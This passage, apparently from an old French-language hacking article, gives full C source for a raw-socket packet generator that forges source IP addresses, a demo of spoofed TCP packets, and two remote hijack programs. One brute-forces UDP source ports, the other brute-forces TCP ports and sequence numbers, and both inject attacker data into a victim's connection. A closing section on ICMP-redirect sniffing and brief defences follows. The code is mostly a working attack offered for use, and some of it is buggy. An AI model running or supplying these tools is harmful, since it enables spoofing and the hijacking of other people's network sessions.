+u_long rdst_ip; /* dst ip */  
+char *src_ip=srci; /* arriv�e src ip */          
+char *dst_ip=dsti; /* arriv�e dst ip */
+
+/* gethostbyname */
+res = gethostbyname(src_ip);
+memcpy(&rsrc_ip, res->h_addr, res->h_length);
+memset(res, 0, sizeof(struct hostent));  
+res = gethostbyname(dst_ip);
+memcpy(&rdst_ip, res->h_addr, res->h_length);
+/* fin */
+
+/* Ouvre socket */
+if(!(lesock=socket(AF_INET, SOCK_RAW, IPPROTO_RAW)))return(-1);   
+
+/* entre DATA  + entre taille du packet */
+if(strlen(data)<4096){
+strcpy(picmp.buffer,data);
+}
+else{
+printf("Buffer OverfloW ?!! :o)\n");
+exit(0);
+}
+szbuff=strlen(picmp.buffer);
+szpkt=sizeof(struct iphdr) + sizeof(struct icmphdr) + szbuff;
+/* fabrique le packet */
+memset(&picmp, 0, szpkt); 
+
+picmp.ip.version = 4; /* IPV4 */
+picmp.ip.ihl = 5; 
+picmp.ip.tot_len = htons(szpkt); /* Taille du packet */
+picmp.ip.id = htons(rid); /* ID */
+picmp.ip.frag_off = htons(frago); /* frag off */ 
+picmp.ip.ttl = rttl; /* TTL */
+picmp.ip.protocol = 1; /* Protocol 1 = ICMP*/
+picmp.ip.saddr = rsrc_ip; /* source ip */
+picmp.ip.daddr = rdst_ip; /* dst ip */
+picmp.ip.check = in_cksum((char *)&picmp,IPHDRSIZE);
+
+picmp.icmp.type = type; /* port source */    
+picmp.icmp.code = code; /* port dest */
+if(idn>0)picmp.icmp.un.echo.id = idn; /* ID */
+if(seqn>0)picmp.icmp.un.echo.sequence = seqn; /* SEQ */
+if(gate>0)picmp.icmp.un.gateway = gate; /* gateway */
+if(mtun>0)picmp.icmp.un.frag.mtu = mtun; /* MTU */
+picmp.icmp.checksum = in_cksum((char *)&picmp,IPHDRSIZE + ICMPHDRSIZE+ szbuff);
+sock.sin_family = AF_INET;
+sock.sin_addr.s_addr = picmp.ip.daddr; /*  ip dest */  
+
+/* Envoie le packet!! */
+if(sendto(lesock,&picmp, szpkt, 0, (struct sockaddr *) &sock,
+sizeof(struct sockaddr)) == -1) { perror("sendto"); return(-1); }
+close(lesock);
+}
+
+/* Checksum */
+unsigned short in_cksum(u_short *addr, int len) 
+{ 
+register int nleft = len; 
+register u_short *w = addr; 
+register int sum = 0; 
+u_short answer = 0;
+while (nleft > 1) 
+{ 
+sum += *w++; 
+nleft -= 2; 
+} 
+if (nleft == 1) 
+{ 
+*(u_char *)(&answer) = *(u_char *)w ; 
+sum += answer; 
+} 
+sum = (sum >> 16) + (sum & 0xffff);
+sum += (sum >> 16); 
+answer = ~sum; 
+return(answer);
+} 
+/*************************************************************************/
+/*************************************************************************/
+
+4- Generateur de packet 
+_______________________
+
+/****************************************************************************/
+/*           GENERATEUR DE PACKET TCP/UDP/ICMP BY @ANTI-SOCIAL@             */
+/****************************************************************************/
+
+/* Anti-Social => lionel56@nether.net */
+/* Generateur de packet TCP/UDP/ICMP */
+/* Thx: 
+ * kalou & aligator & v!l XSFX & HegemOon & Spoty & et les autres...
+ * #0z0n3 & #codefr & #bsdfr & #root ;) 
+ */
+#include <stdio.h>
+#include <unistd.h>
+#include <stdarg.h>
+#include <netinet/ip.h> 
+#include <netinet/tcp.h> 
+#include <netinet/udp.h> 
+#include <netinet/ip_icmp.h> 
+#include <netinet/in.h>
+#include <sys/time.h>
+#include <sys/types.h>
+#include <netdb.h>
+#include <string.h>
+
+#define ICMPHDRSIZE sizeof(struct icmphdr)
+#define TCPHDRSIZE sizeof(struct tcphdr)
+#define UDPHDRSIZE sizeof(struct udphdr)
+#define IPHDRSIZE sizeof(struct iphdr)
+#define PSEUDOHDRSIZE sizeof(struct pseudohdr)
+
+int packet_tcp(srci,dsti,srcp,dstp,rid,frago,rttl,data,syn,fin,ack,rst,psh,urg,res1,res2,seqn,ackn,urgp,doff,winn);
+int packet_udp(srci,dsti,srcp,dstp,rid,frago,rttl,data);
+int packet_icmp(srci,dsti,rid,frago,rttl,data,code,type,gate,seqn,idn,mtun);
+
+struct pseudohdr {
+	u_long saddr;
+	u_long daddr;
+	u_char zero;
+	u_char protocol;
+	u_short length;
+};
+
+struct tcp_packet
+{
+struct iphdr    ip;
+struct tcphdr   tcp;
+struct pseudohdr    pseudo;
+char buffer[4096];
+};
+
+struct udp_packet
+{
+struct iphdr    ip;
+struct udphdr   udp;
+char buffer[4096];
+};
+
+struct icmp_packet
+{
+struct iphdr    ip;
+struct icmphdr   icmp;
+char buffer[4096];
+};
+
+/*   DEFINE OPTIONS TCP       */
+/*   DEFINE OPTIONS UDP       */
+/*   DEFINE OPTIONS ICMP      */
+
+int main(int argc,char **argv) {
+	int i; 
+
+		printf("Anti-Social\n");
+		printf("Generateur Packet TCP/UDP/ICMP\n");
+if(argc<2){
+		printf("usage:%s [TCP] [UDP] [ICMP]\n",argv[0]);
+	exit(0);
+}
+if(strncmp(argv[1],"TCP",3)){
+usleep(10);
+}else{
+char srci[4096],dsti[4096],data[4096];
+char syn[20],fin[20],ack[20],rst[20],psh[20],urg[20];
+char qres2[20],qseqn[20],qackn[20],qurgp[20],qdoff[20],qres1[20],qwinn[20];
+int *res2=0,*seqn=0,*ackn=0,*urgp=0,*doff=0,*winn=0,*res1=0;
+int dstp=0,srcp=0,num=0,rid=0,frago=0,rttl=0; 
+printf("Packet TCP\n");
+
+printf("IP Source:\n");
+bzero(srci,sizeof(srci));
+scanf("%s",srci);
+printf("IP Destination:\n");
+bzero(dsti,sizeof(dsti));
+scanf("%s",dsti);
+printf("Port Source:\n");
+scanf("%d",&srcp);
+printf("Port Destination:\n");
+scanf("%d",&dstp);
+
+printf("IP->id:\n");
+scanf("%d",&rid);
+printf("IP->FragOff:\n");
+scanf("%d",&frago);
+printf("IP->ttl:\n");
+scanf("%d",&rttl);
+
+printf("Flag SYN (y/n) :\n");
+bzero(syn,sizeof(syn));
+scanf("%s",syn);
+if((syn[0]=='y') || (syn[0]=='Y')){
+printf("Flag syn\n");
+}else{
+printf("No flag syn\n");
+memset(syn,0x0,sizeof(syn));
+}
+printf("Flag FIN (y/n) :\n");
+bzero(fin,sizeof(fin));
+scanf("%s",fin);
+if((fin[0]=='y') || (fin[0]=='Y')){
+printf("Flag fin\n");
+}else{
+printf("No flag fin\n");
+memset(fin,0x0,sizeof(fin));
+}
+printf("Flag RST (y/n) :\n");
+bzero(rst,sizeof(rst));
+scanf("%s",rst);
+if((rst[0]=='y') || (rst[0]=='Y')){
+printf("Flag rst\n");
+}else{
+printf("No flag rst\n");
+memset(rst,0x0,sizeof(rst));
+}
+printf("Flag PSH (y/n) :\n");
+bzero(psh,sizeof(psh));
+scanf("%s",psh);
+if((psh[0]=='y') || (psh[0]=='Y')){
+printf("Flag psh\n");
+}else{
+printf("No flag psh\n");
+memset(psh,0x0,sizeof(psh));
+}
+printf("Flag ack (y/n) :\n");
+bzero(ack,sizeof(ack));
+scanf("%s",ack);
+if((ack[0]=='y') || (ack[0]=='Y')){
+printf("Flag ack\n");
+}else{
+printf("No flag ack\n");
+memset(ack,0x0,sizeof(ack));
+}
+printf("Flag URG (y/n) :\n");
+bzero(urg,sizeof(urg));
+scanf("%s",urg);
+if((urg[0]=='y') || (urg[0]=='Y')){
+printf("Flag urg\n");
+}else{
+printf("No flag urg\n");
+memset(urg,0x0,sizeof(urg));
+}
+printf("RES1 (y/n) :\n");
+bzero(qres1,sizeof(qres1));
+scanf("%s",qres1);
+if((qres1[0]=='y') || (qres1[0]=='Y')){
+printf("RES1 value:\n");
+scanf("%d",&res1);
+}else{
+printf("No RES1\n");
+res1=0;
+}
+printf("RES2 (y/n) :\n");
+bzero(qres2,sizeof(qres2));
+scanf("%s",qres2);
+if((qres2[0]=='y') || (qres2[0]=='Y')){
+printf("RES2 value:\n");
+scanf("%d",&res2);
+}else{
+printf("No RES2\n");
+res2=0;
+}
+printf("DOFF (y/n) :\n");
+bzero(qdoff,sizeof(qdoff));
+scanf("%s",qdoff);
+if((qdoff[0]=='y') || (qdoff[0]=='Y')){
+printf("DOFF value(par defaut:5 ?):\n");
+scanf("%d",&doff);
+}else{
+printf("No DOFF\n");
+doff=0;
+}
+
+printf("SEQ num (y/n) :\n");
+bzero(qseqn,sizeof(qseqn));
+scanf("%s",qseqn);
+if((qseqn[0]=='y') || (qseqn[0]=='Y')){
+printf("SEQ value:\n");
+scanf("%d",&seqn);
+}else{
+printf("No SEQ\n");
+seqn=0;
+}
+printf("ACK num(y/n) :\n");
+bzero(qackn,sizeof(qackn));
+scanf("%s",qackn);
+if((qackn[0]=='y') || (qackn[0]=='Y')){
+printf("ACK value:\n");
+scanf("%d",&ackn);
+}else{
+printf("No ACK\n");
+ackn=0;
+}
+printf("WIN (y/n) :\n");
+bzero(qwinn,sizeof(qwinn));
+scanf("%s",qwinn);
+if((qwinn[0]=='y') || (qwinn[0]=='Y')){
+printf("WIN value(par defaut:512 ?):\n");
+scanf("%d",&winn);
+}else{
+printf("No WIN\n");
+winn=0;
+}
+printf("URGPTR (y/n) :\n");
+bzero(qurgp,sizeof(qurgp));
+scanf("%s",qurgp);
+if((qurgp[0]=='y') || (qurgp[0]=='Y')){
+printf("WIN value(par defaut:512 ?):\n");
+scanf("%d",&urgp);
+}else{
+printf("No WIN\n");
+urgp=0;
+}
+
+printf("Nombre de packet � envoier:\n");
+scanf("%d",&num);
+printf("Data(contenu du packet...):\n");
+bzero(data,sizeof(data));
+scanf("%s",data);
+
+printf("Packet TCP sur %s:%d de %s:%d  (*%d)\n" ,dsti,dstp,srci,srcp,num);
+for(i=0;i<=num;i++){
+if(!packet_tcp(srci,dsti,srcp,dstp,rid,frago,
+              rttl,data,syn,fin,ack,rst,psh,
+              urg,res1,res2,seqn,ackn,urgp,doff,winn)) 
+ {
+		printf("%d:Packet TCP envoi�\n",i); }
+
+else{
+		printf("%d:Packet TCP probl�me\n",i);
+	exit(0);
+}
+usleep(1000);
+}
+}
+
+if(strncmp(argv[1],"UDP",3)){
+usleep(10);
+}else{
+char srci[4096],dsti[4096],data[4096];
+int srcp=0,dstp=0,num=0;
+int rid=0,frago=0,rttl=0; 
+printf("Packet UDP\n");
+
+printf("IP Source:\n");
+bzero(srci,sizeof(srci));
+scanf("%s",srci);
+printf("IP Destination:\n");
+bzero(dsti,sizeof(dsti));
+scanf("%s",dsti);
+printf("Port Source:\n");
+scanf("%d",&srcp);
+printf("Port Destination:\n");
+scanf("%d",&dstp);
+
+printf("IP->id:\n");
+scanf("%d",&rid);
+printf("IP->FragOff:\n");
+scanf("%d",&frago);
+printf("IP->ttl:\n");
+scanf("%d",&rttl);
+
+printf("Nombre de packet � envoier:\n");
+scanf("%d",&num);
+printf("Data(contenu du packet...):\n");
+bzero(data,sizeof(data));
+scanf("%s",data);
+
+printf("Packet UDP sur %s:%d de %s:%d  (*%d)\n" ,dsti,dstp,srci,srcp,num);
+for(i=0;i<=num;i++){
+if (!packet_udp(srci,dsti,srcp,dstp,rid,frago,rttl,data)) 
+{
+		printf("%d:Packet UDP envoi�\n",i); }
+
+else{
+		printf("%d:Packet UDP probl�me\n",i);
+	exit(0);
+}
+usleep(1000);
+}
+
+}
+
+if(strncmp(argv[1],"ICMP",3)){
+usleep(10);
+}else{
+char srci[4096],dsti[4096],data[4096];
+char qgate[20],qseqn[20],qidn[20],qmtun[20];
+int srcp=0,dstp=0,num=0,type=0,code=0;
+int rid=0,frago=0,rttl=0,gate=0,seqn=0,idn=0,mtun=0;
+printf("Packet ICMP\n");
+
+printf("IP Source:\n");
+bzero(srci,sizeof(srci));
+scanf("%s",srci);
+printf("IP Destination:\n");
+bzero(dsti,sizeof(dsti));
+scanf("%s",dsti);
+
+printf("IP->id:\n");
+scanf("%d",&rid);
+printf("IP->FragOff:\n");
+scanf("%d",&frago);
+printf("IP->ttl:\n");
+scanf("%d",&rttl);
+
+printf("TYPE icmp:\n");
+scanf("%d",&type);
+printf("CODE icmp:\n");
+scanf("%d",&code);
+printf("SEQ num (y/n) :\n");
+bzero(qseqn,sizeof(qseqn));
+scanf("%s",qseqn);
+if((qseqn[0]=='y') || (qseqn[0]=='Y')){
+printf("SEQ value:\n");
+scanf("%d",&seqn);
+}else{
+printf("No SEQ\n");
+seqn=0;
+}
+printf("ID num (y/n) :\n");
+bzero(qidn,sizeof(qidn));
+scanf("%s",qidn);
+if((qidn[0]=='y') || (qidn[0]=='Y')){
+printf("ID value:\n");
+scanf("%d",&idn);
+}else{
+printf("No ID\n");
+idn=0;
+}
+printf("MTU num (y/n) :\n");
+bzero(qmtun,sizeof(qmtun));
+scanf("%s",qmtun);
+if((qmtun[0]=='y') || (qmtun[0]=='Y')){
+printf("MTU value:\n");
+scanf("%d",&mtun);
+}else{
+printf("No MTU\n");
+mtun=0;
+}
+printf("GATEWAY (y/n) :\n");
+bzero(qgate,sizeof(qgate));
+scanf("%s",qgate);
+if((qgate[0]=='y') || (qgate[0]=='Y')){
+printf("GATEWAY value:\n");
+scanf("%d",&gate);
+}else{
+printf("No GATEWAY\n");
+gate=0;
+}
+
+printf("Nombre de packet � envoier:\n");
+scanf("%d",&num);
+printf("Data(contenu du packet...):\n");
+bzero(data,sizeof(data));
+scanf("%s",data);
+
+printf("Packet ICMP sur %s de %s  (*%d)\n" ,dsti,srci,num);
+for(i=0;i<=num;i++){
+if (!packet_icmp(srci,dsti,rid,frago,rttl,data,code,type,gate,seqn,idn,mtun)) 
+{
+		printf("%d:Packet ICMP envoi�\n",i); }
+
+else{
+		printf("%d:Packet ICMP probl�me\n",i);
+	exit(0);
+}
+usleep(1000);
+}
+
+}
+}
+
+
+/* connextion MOdif */
+/* ********************************TCP******************************* */
+int
+packet_tcp(srci,dsti,srcp,dstp,rid,frago,rttl,data,syn,fin,ack,rst,psh,urg,res1,res2,seqn,ackn,urgp,doff,winn)
+char *srci, *dsti, *data;
+int srcp, dstp; 
+int rid,frago,rttl;
+char *syn,*fin,*ack,*rst,*psh,*urg;
+int res1,res2;
+int seqn, ackn, urgp, doff, winn; 
+{
+struct sockaddr_in sock;
+struct tcp_packet ptcp;
+struct hostent *res; 
+
+int lesock;
+int szbuff; /* taille du buffer */
+int szpkt; /* taille du packet */
+
+/* configuration packet */
+u_long rsrc_ip; /* src ip */
+u_long rdst_ip; /* dst ip */                 
+int src_prt=srcp; /* src port */
+int dst_prt=dstp; /* dst port */
+char *src_ip=srci; /* arriv�e src ip */          
+char *dst_ip=dsti; /* arriv�e dst ip */
+
+/* gethostbyname */
+res = gethostbyname(src_ip);
+memcpy(&rsrc_ip, res->h_addr, res->h_length);
+memset(res, 0, sizeof(struct hostent));  
+res = gethostbyname(dst_ip);
+memcpy(&rdst_ip, res->h_addr, res->h_length);
+/* fin */
+
+/* Ouvre socket */
+if(!(lesock=socket(AF_INET, SOCK_RAW, IPPROTO_RAW)))return(-1);   
+
+/* entre DATA  + entre taille du packet */
+if(strlen(data)<4096){
+strcpy(ptcp.buffer,data);
+}
+else{
+printf("Buffer OverfloW ?!! :o)\n");
+exit(0);
+}
+szbuff=strlen(ptcp.buffer);
+szpkt=sizeof(struct tcphdr)+sizeof(struct iphdr)+szbuff;
+
+/* fabrique le packet */
+
+memset(&ptcp, 0, szpkt); 
+
+ptcp.pseudo.saddr = rsrc_ip;
+ptcp.pseudo.daddr = rdst_ip; 
+ptcp.pseudo.zero = 0;
+ptcp.pseudo.protocol=6;
+ptcp.pseudo.length = htons( 8 + szbuff );
+
+ptcp.ip.version = 4; /* IPV4 */
+ptcp.ip.ihl = 5; 
+ptcp.ip.tot_len = htons(szpkt); /* Taille du packet */
+ptcp.ip.id = htons(rid); /* ID */
+ptcp.ip.frag_off = htons(frago); /* frag off */ 
+ptcp.ip.ttl = rttl; /* TTL */
+ptcp.ip.protocol = 6; /* Protocol 6 = TCP */
+ptcp.ip.saddr = rsrc_ip; /* source ip */
+ptcp.ip.daddr = rdst_ip; /* dst ip */
+ptcp.ip.check = in_cksum((char *)&ptcp,IPHDRSIZE);
+
+ptcp.tcp.source = htons(src_prt); /* port source */    
+ptcp.tcp.dest = htons(dst_prt); /* port dest */
+if(seqn>0)ptcp.tcp.seq = seqn;
+if(ackn>0)ptcp.tcp.ack_seq = ackn;
+if(res1>0)ptcp.tcp.res1 = res1;
+if(doff>0)ptcp.tcp.doff = doff; /* 5? */
+if(strlen(fin)>0)ptcp.tcp.fin = 1;
+if(strlen(syn)>0)ptcp.tcp.syn = 1;
+if(strlen(rst)>0)ptcp.tcp.rst = 1;
+if(strlen(psh)>0)ptcp.tcp.psh = 1;
+if(strlen(ack)>0)ptcp.tcp.ack = 1;
+if(strlen(urg)>0)ptcp.tcp.urg = 1;
+if(res2>0)ptcp.tcp.res2 = res2;
+if(winn>0)ptcp.tcp.window = winn; /* 512 ? */
+if(urgp>0)ptcp.tcp.urg_ptr= urgp;
+// ptcp.tcp.len = htons(8 + szbuff); /* taille buffer udp */
+ptcp.tcp.check = in_cksum((char *)&ptcp,IPHDRSIZE + TCPHDRSIZE 
++ szbuff + PSEUDOHDRSIZE);
+
+sock.sin_family = AF_INET;
+sock.sin_addr.s_addr = ptcp.ip.daddr; /* ip dest */ 
+sock.sin_port = ptcp.tcp.dest;
+
+/* Envoie le packet!! */
+sendto(lesock, &ptcp, szpkt, 0, (struct sockaddr *) &sock,
+sizeof(struct sockaddr));
+
+/* Fermeture du socket */
+close(lesock);
+}
+/* **************************UDP************************************** */
+int packet_udp(srci,dsti,srcp,dstp,rid,frago,rttl,data)
+char *srci,*dsti,*data; 
+int srcp,dstp,rid,frago,rttl;
+{ 
+struct sockaddr_in sock;
+struct udp_packet   pudp;
+struct hostent *res; 
+
+int lesock;
+int szbuff; /* taille du buffer */
+int szpkt; /* taille du packet */
+
+/* configuration packet */
+u_long rsrc_ip; /* src ip */
+u_long rdst_ip; /* dst ip */                 
+int src_prt=srcp; /* src port */
+int dst_prt=dstp; /* dst port */
+char *src_ip=srci; /* arriv�e src ip */          
+char *dst_ip=dsti; /* arriv�e dst ip */
+
+/* gethostbyname */
+res = gethostbyname(src_ip);
+memcpy(&rsrc_ip, res->h_addr, res->h_length);
+memset(res, 0, sizeof(struct hostent));  
+res = gethostbyname(dst_ip);
+memcpy(&rdst_ip, res->h_addr, res->h_length);
+/* fin */
+
+/* Ouvre socket */
+if(!(lesock=socket(AF_INET, SOCK_RAW, IPPROTO_RAW)))return(-1);   
+
+/* entre DATA  + entre taille du packet */
+if(strlen(data)<4096){
+strcpy(pudp.buffer,data);
+}
+else{
+printf("Buffer OverfloW ?!! :o)\n");
+exit(0);
+}
+szbuff=strlen(pudp.buffer);
+szpkt=sizeof(struct udphdr)+sizeof(struct iphdr)+szbuff;
+
+/* fabrique le packet */
+
+memset(&pudp, 0, szpkt); 
+
+pudp.ip.version = 4; /* IPV4 */
+pudp.ip.ihl = 5; 
+pudp.ip.tot_len = htons(szpkt); /* Taille du packet */
+pudp.ip.id = htons(rid); /* ID */
+pudp.ip.frag_off = htons(frago); /* frag off */ 
+pudp.ip.ttl = rttl; /* TTL */
+pudp.ip.protocol = 17; /* Protocol 17 = UDP*/
+pudp.ip.saddr = rsrc_ip; /* source ip */
+pudp.ip.daddr = rdst_ip; /* dst ip */
+pudp.ip.check = in_cksum((char *)&pudp,IPHDRSIZE);
+
+pudp.udp.source = htons(src_prt); /* port source */    
+pudp.udp.dest = htons(dst_prt); /* port dest */
+pudp.udp.len = htons(8 + szbuff); /* taille buffer udp */
+pudp.udp.check = in_cksum((char *)&pudp,IPHDRSIZE + UDPHDRSIZE 
++ szbuff);
+
+sock.sin_family = AF_INET;
+sock.sin_addr.s_addr = pudp.ip.daddr; /*  ip dest */ 
+sock.sin_port = pudp.udp.dest; 
+
+/* Envoie le packet!! */
+sendto(lesock, &pudp, szpkt, 0, (struct sockaddr *) &sock,
+sizeof(struct sockaddr));
+
+/* Fermeture du socket */
+close(lesock);
+}
+
+/* ****************************ICMP***************************** */
+int
+packet_icmp(srci,dsti,rid,frago,rttl,data,code,type,gate,seqn,idn,mtun)
+char *srci,*dsti,*data;
+int type,code,gate,seqn,idn,mtun,rid,frago,rttl;
+{  
+struct sockaddr_in sock; 
+struct icmp_packet   picmp;
+struct hostent *res; 
+
+int lesock;
+int szbuff; /* taille du buffer */
+int szpkt; /* taille du packet */
+
+/* configuration packet */
+u_long rsrc_ip; /* src ip */
+u_long rdst_ip; /* dst ip */  
+char *src_ip=srci; /* arriv�e src ip */          
+char *dst_ip=dsti; /* arriv�e dst ip */
+
+/* gethostbyname */
+res = gethostbyname(src_ip);
+memcpy(&rsrc_ip, res->h_addr, res->h_length);
+memset(res, 0, sizeof(struct hostent));  
+res = gethostbyname(dst_ip);
+memcpy(&rdst_ip, res->h_addr, res->h_length);
+/* fin */
+
+/* Ouvre socket */
+if(!(lesock=socket(AF_INET, SOCK_RAW, IPPROTO_RAW)))return(-1);   
+
+/* entre DATA  + entre taille du packet */
+if(strlen(data)<4096){
+strcpy(picmp.buffer,data);
+}
+else{
+printf("Buffer OverfloW ?!! :o)\n");
+exit(0);
+}
+szbuff=strlen(picmp.buffer);
+szpkt=sizeof(struct iphdr) + sizeof(struct icmphdr) + szbuff;
+/* fabrique le packet */
+memset(&picmp, 0, szpkt); 
+
+picmp.ip.version = 4; /* IPV4 */
+picmp.ip.ihl = 5; 
+picmp.ip.tot_len = htons(szpkt); /* Taille du packet */
+picmp.ip.id = htons(rid); /* ID */
+picmp.ip.frag_off = htons(frago); /* frag off */ 
+picmp.ip.ttl = rttl; /* TTL */
+picmp.ip.protocol = 1; /* Protocol 1 = ICMP*/
+picmp.ip.saddr = rsrc_ip; /* source ip */
+picmp.ip.daddr = rdst_ip; /* dst ip */
+picmp.ip.check = in_cksum((char *)&picmp,IPHDRSIZE);
+
+picmp.icmp.type = type; /* port source */    
+picmp.icmp.code = code; /* port dest */
+if(idn>0)picmp.icmp.un.echo.id = idn; /* ID */
+if(seqn>0)picmp.icmp.un.echo.sequence = seqn; /* SEQ */
+if(gate>0)picmp.icmp.un.gateway = gate; /* gateway */
+if(mtun>0)picmp.icmp.un.frag.mtu = mtun; /* MTU */
+picmp.icmp.checksum = in_cksum((char *)&picmp,IPHDRSIZE + ICMPHDRSIZE+ szbuff);
+sock.sin_family = AF_INET;
+sock.sin_addr.s_addr = picmp.ip.daddr; /*  ip dest */  
+
+/* Envoie le packet!! */
+if(sendto(lesock,&picmp, szpkt, 0, (struct sockaddr *) &sock,
+sizeof(struct sockaddr)) == -1) { perror("sendto"); return(-1); }
+close(lesock);
+}
+
+/* Checksum */
+unsigned short in_cksum(u_short *addr, int len) 
+{ 
+register int nleft = len; 
+register u_short *w = addr; 
+register int sum = 0; 
+u_short answer = 0;
+while (nleft > 1) 
+{ 
+sum += *w++; 
+nleft -= 2; 
+} 
+if (nleft == 1) 
+{ 
+*(u_char *)(&answer) = *(u_char *)w ; 
+sum += answer; 
+} 
+sum = (sum >> 16) + (sum & 0xffff);
+sum += (sum >> 16); 
+answer = ~sum; 
+return(answer);
+} 
+
+
+/****************************************************************************/
+/****************************************************************************/
+
+Petite demo:
+$genesr TCP
+...
+Packet TCP sur 127.0.0.1:556 de 198.1.1.4:25  (*10)
+0:Packet TCP envoi�
+1:Packet TCP envoi�
+2:Packet TCP envoi�
+3:Packet TCP envoi�
+4:Packet TCP envoi�
+5:Packet TCP envoi�
+6:Packet TCP envoi�
+7:Packet TCP envoi�
+8:Packet TCP envoi�
+9:Packet TCP envoi�
+10:Packet TCP envoi�   
+=>
+Sep  2 05:45:02 anti-social tcplog: remotefs request from 198.1.1.4
+Sep  2 05:45:03 anti-social last message repeated 10 times         
+5- IP HIJACK 
+____________
+
+(REMOTE)
+Plusieurs solutions:
+  - Detourner les trames et les sniffer.
+    -> Packet ICMP => detournement de routeur => sniff
+                   -> Hijack connection
+
+  - Brute force sur les numeros de seq.
+    -> Teste de numero de seq => Min - Max
+                          -> Envoi seq brute force...
+
+Vous pouvez trouver deux codes d'hijack:
+ -> UDP
+ -> TCP (par brute force de seq)
+
++
+
+Une explication de la methode d'hijack par ICMP+SNIFF+HIJACK-PROTO.
+
+/*
+ * HIJACK CONNECTION REMOTE UDP
+ * By Anti-Social (cronos56@yahoo.com)
+ * www.nether.net/~lionel56
+ * Use LIBSOCKET.C ...
+ */
+
+#include <stdlib.h>
+#include <stdio.h>
+
+/*
+ * Hijack UDP en remote => [IP src] [IP dest] [PORT src] [PORT dst] [DATA]
+ * IP src => on doit la connaitre
+ * IP dst => on la connait aussi
+ * Port dst => on le connait aussi
+ * Port src => on ne le connait pas donc aleatoire
+ * DATA => les données que on veut envoyer sur la connection de la victime.
+ * METHODE = brute force sur le port src (1024-10000)
+ */
+
+int packet_udp(srci, dsti, srcp, dstp, rid, frago, rttl, data);
+
+main(int argc, char **argv)
+{
+    int srcp, dstp;
+    int srcpb, srcph;
+    int rid, frago, rttl;
+    printf("Anti-Social\n");
+    printf("Hijack UDP connection\n");
+    if (argc < 4) {
+	printf
+	    ("usage:%s [IP src] [IP dest] [PORT src bas] [PORT src haut] [PORT dst] [DATA]\n",
+	     argv[0]);
+	exit(0);
+    }
+    srcpb = atoi(argv[3]);
+    srcph = atoi(argv[4]);
+    dstp = atoi(argv[5]);
+    rid = 242;
+    frago = 0;
+    printf("Envoie packets:\n");
+/* **************************UDP**************************************** */
+/* packet_udp( source_ip, destination_ip, source_port, destination_port, */
+/*            ip->ID, frag_off, ttl, DATA);                              */
+/* ********************************************************************* */
+    for (srcp = srcpb; srcp <= srcph; srcp++) {
+	rttl = 1 + (int) (255.0 * rand() / (RAND_MAX + 64.0));
+	if (packet_udp
+	    (argv[1], argv[2], srcp, dstp, rid, frago, rttl,
+	     argv[6]) == -1) {perror("packet_udp");
+	    return (-1);
+	}
+	printf(".");
+    }
+    printf("\nEnvoie fini\n");
+}
+
+/*************************************************************************/
+/*************************************************************************/
+
+
+/*
+ * HIJACK CONNECTION REMOTE TCP
+ * By Anti-Social (cronos56@yahoo.com)
+ * www.nether.net/~lionel56
+ * Use LIBSOCKET.C ...
+ */
+
+#include <stdlib.h>
+#include <stdio.h>
+
+/*
+ * Hijack TCP en remote 
+ * IP src => on doit la connaitre
+ * IP dst => on la connait aussi
+ * Port dst => on le connait aussi
+ * Port src => on ne le connait pas donc aleatoire
+ * Seq => on ne la connait
+ * ack => on s'en fou car on veut pas reprendre la connection mais envoyer
+ *        un data, mais si apres la connection est mal coupé peut importe.
+ * win => Pour la fenêtre de différence entre le numéro de seq réel et invoqué 
+ * DATA => les données que on veut envoyer sur la connection de la victime.
+ * METHODE = brute force sur le port src (1024-10000) & seq (a rechercher)
+ *           & win (1024)
+ */
+
+int packet_tcp(srci, dsti, srcp, dstp, rid, frago, rttl, data, syn, fin,
+	       ack, rst, psh, urg, res1, res2, seqn, ackn, urgp, doff,
+	       winn);
+
+main(int argc, char **argv)
+{
+    int srcp, dstp;
+    int srcpb, srcph;
+    int rid, frago, rttl;
+    char syn[20], fin[20], ack[20], rst[20], psh[20], urg[20];
+    int res1 = 0, res2 = 0, ackn = 12345, urgp = 0, doff = 0, winn;
+    int seqh, seqb, seqn;
+    printf("Anti-Social\n");
+    printf("Hijack TCP connection\n");
+    if (argc < 7) {
+	printf
+	    ("usage:%s [IP src] [IP dest] [PORT src bas] [PORT src haut] [PORT dst] [SEQ bas] [SEQ haut] [DATA]\n",
+	     argv[0]);
+	exit(0);
+    }
+    srcpb = atoi(argv[3]);
+    srcph = atoi(argv[4]);
+    dstp = atoi(argv[5]);
+    seqb = atoi(argv[6]);
+    seqh = atoi(argv[7]);
+    winn = 1024;
+    rid = 242;
+    frago = 0;
+    memset(syn, 0x0, sizeof(syn));
+    memset(fin, 0x0, sizeof(fin));
+    memset(ack, 0x0, sizeof(ack));
+    ack[0] = 'y';
+    memset(rst, 0x0, sizeof(rst));
+    memset(psh, 0x0, sizeof(psh));
+    psh[0] = 'y';
+    memset(urg, 0x0, sizeof(urg));
+    printf("Envoie packets:\n");
+
+/* ********************************TCP********************************** */
+/* packet_tcp( source_ip, destination_ip, source_port, destination_port, */
+/*            ip->ID, frag_off, ttl, DATA, FLAG_SYN, FLAG_FIN, FLAG_ACK, */
+/*            FLAG_RESET, FLAG_PUSH, FLAG_URGENT, 0, 0, SEQUENCE, ACK,   */
+/*            URGENT_PTR, tcp->DOFF, WIN);                               */
+/* ********************************************************************* */
+    for (srcp = srcpb; srcp <= srcph; srcp++) {
+	for (seqn = seqb; seqn <= seqh; seqn++) {
+	    rttl = 1 + (int) (255.0 * rand() / (RAND_MAX + 64.0));
+	    if (packet_tcp
+		(argv[1], argv[2], srcp, dstp, rid, frago, rttl, argv[8],
+		 syn, fin, ack, rst, psh, urg, res1, res2, seqn, ackn,
+		 urgp, doff, winn) == -1) {
+		perror("packet_udp");
+		return (-1);
+	    }
+	    printf(".");
+	}
+    }
+    printf("\nEnvoie fini\n");
+}
+
+/*************************************************************************/
+/*************************************************************************/
+
+L'autre solution est de detourner la connection pour pouvoir la sniffer en
+utilisant les routeurs.
+En envoiant un packet icmp on peut dire à la connection de changer de routeur
+et donc aller sur nous, apres il ne vous reste plus qu'a sniff puis hijack... (voir article noroute de mémoire...)
+
+6- Eviter ce genre d'attaque...
+_______________________________
+
+Il y a plusieurs possibilités:
+  - Ne pas ce connecter a internet ;)
+  - Crypter les packets => Si hijack données illisible...(ex:ssh)
+  - Autre ??
+
+@Anti-Social@
